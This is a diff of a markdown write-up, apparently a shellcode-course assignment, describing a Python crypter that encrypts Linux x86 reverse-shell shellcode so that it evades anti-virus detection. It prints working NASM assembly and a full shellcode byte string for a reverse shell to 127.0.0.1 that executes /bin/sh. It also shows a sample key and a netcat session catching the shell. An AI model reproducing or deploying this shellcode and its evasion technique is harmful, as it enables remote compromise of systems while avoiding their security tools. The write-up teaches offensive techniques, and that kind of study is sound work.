@@ -8,6 +8,8 @@ Our Crypter will be based on the following components:
 - Initialization vectors are generated using os.urandom ().
 - The password will be static, but in every non-test consideration it should never be placed inside the file, but received from the user
 
+### Shellcode
+
 We'll use Crypter against shellcode from Assignment No. 2, which means reverse shell. These operations are carried out in order to deceive or bypass anti-virus software or other security systems.
 
 To start with, here is our shellcode in NASM:
@@ -35,38 +37,19 @@ cleaning:
 	xor ebx, ebx
 	xor ecx, ecx
 	xor edx, edx
-
-sys_socket:
-	; {C code} --> int reverse_socket = socket(AF_INET, SOCK_STREAM, 0);
-	
-	; syscall definition
+sys_socket:	
 	mov al, 102 		; syscall - socketcall
 	mov bl, 1		; socketcall type - sys_socket
-
-	; pushing the sys_socket atributes in reverse order (AF_INET, SOCK_STREAM, IPPROTO_IP)
 	xor esi, esi		
 	push esi		; IPPROTO_IP = 0 (null)
 	push 1			; SOCK_STREAM = 1
 	push 2			; AF_INET = 2 (PF_INET)
-
 	mov ecx, esp 		; directing the stack pointer to sys_socket() function arguments
-
 	int 128			; syscall execution
-
 	mov edx, eax		; saving the reverse_socket pointer for further usage
-
 sys_connect:
-	; {C code} --> struct sockaddr_in address;
-        ; {C code} --> address.sin_addr.s_addr = inet_addr(TARGET);
-        ; {C code} --> address.sin_port = htons(PORT);
-        ; {C code} --> address.sin_family = AF_INET;
-	; {C code} --> connect(reverse_socket,(struct sockaddr *)&address, sizeof(address));
-
-	; syscall definition
 	mov al, 102		; syscall - socketcall
 	mov bl, 3		; socketcall type - sys_connect
-
-	; pushing the address struct arguments
 	push esi		; pushing 0 (null)
 	mov ecx, 0x06050584	; moving the 127.0.0.1 address into ECX (reverse order, becouse of nulls, we have to add value 5 in every place...
 	sub ecx, 0x05050505	; ... and then substract value 5 from every place
@@ -75,58 +58,33 @@ sys_connect:
 	push word 2		; AF_INET = 2
 	mov ecx, esp		; directing the stack pointer to address struct arguments
 	
-	; pushing the sys_connect arguments in reverse order (int reverse_socket, const struct sockaddr *addr, socklen_t addrlen) 
 	push 16			; socklen_t addrlen (size) = 16
 	push ecx		; const struct sockaddr *addr - stack pointer with struct arguments	
 	push edx		; reverse_socket pointer
-
 	mov ecx, esp		; directing the stack pointer to sys_bind() function arguments
-
 	int 128			; syscall execution
-	
 sys_dup2:
-	; {C code} --> dup2(sock,2);
-        ; {C code} --> dup2(sock,1);
-        ; {C code} --> dup2(sock,0);
-
-	; syscall definition
 	mov al, 63		; syscall - dup2
-	
 	mov ebx, edx		; overwriting the reverse_socket pointer
 	xor ecx, ecx		; STDIN - 0 (null)
-
 	int 128			; syscall execution
-
-	; syscall definition
 	mov al, 63		; syscall - dup2
 	mov cl, 1		; STDOUT - 1
-	
 	int 128			; syscall execution
-
-	; syscall definition
 	mov al, 63		; syscall - dup2
 	mov cl, 2		; STDERR - 2
-
 	int 128			; syscall execution
-
 sys_execve:
-	; {C code} --> execve("/bin/sh",NULL,NULL);
-
-	; syscall definition
 	mov al, 11		; syscall - execve
-
-	; pushing the sys_execve string argument
 	xor esi, esi
 	push esi		; pushing 0 (null)
 
 	push 0x68732f6e		; pushing "n/sh"
 	push 0x69622f2f		; pushing "//bi"
 
-        ; pushing the sys_execve arguments (const char *filename, char *const argv[], char *const envp[])
 	mov ebx, esp		; directing the stack pointer to sys_execve() string argument
 	xor ecx, ecx		; char *const envp[] = 0 (null)
 	xor edx, edx		; char *const argv[] = 0 (null)
-
 	int 128			; syscall execution
 ```
 We compile, link, put the result in shellcode.c wrapper and run to check how it works.
@@ -154,6 +112,9 @@ Excellent, it works how it should. Our shellcode will therefore be:
 ```sh
 "\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\x66\xb3\x01\x31\xf6\x56\x6a\x01\x6a\x02\x89\xe1\xcd\x80\x89\xc2\xb0\x66\xb3\x03\x56\xb9\x84\x05\x05\x06\x81\xe9\x05\x05\x05\x05\x51\x66\x68\x11\x5c\x66\x6a\x02\x89\xe1\x6a\x10\x51\x52\x89\xe1\xcd\x80\xb0\x3f\x89\xd3\x31\xc9\xcd\x80\xb0\x3f\xb1\x01\xcd\x80\xb0\x3f\xb1\x02\xcd\x80\xb0\x0b\x31\xf6\x56\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x31\xc9\x31\xd2\xcd\x80"
 ```
+
+### Encrypter
+
 Below is the Encrypter code in Python, which I tried to explain using comments in individual sections.
 ```python
 #!/usr/bin/python3
@@ -240,6 +201,8 @@ $ cat key.key
 tCJp16dKRFfkskbfy6kew8_fkNk4EHIfv1et8BNaxRE=
 ```
 Fantastic, it works as it should. Our shellcode in no way resembles the one we used for the encryption operation.
+
+### Decrypter
 
 Below is the Decrypter code, written in Python, which will perform exactly the opposite operations to restore the original shellcode in case a valid key.key file is provided. Otherwise, the program will return an error indicating an invalid key.
 
@@ -375,3 +338,5 @@ connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 43262
 uname -a
 Linux kali 5.4.0-kali4-amd64 #1 SMP Debian 5.4.19-1kali1 (2020-02-17) x86_64 GNU/Linux
 ```
+
+### Pwned.
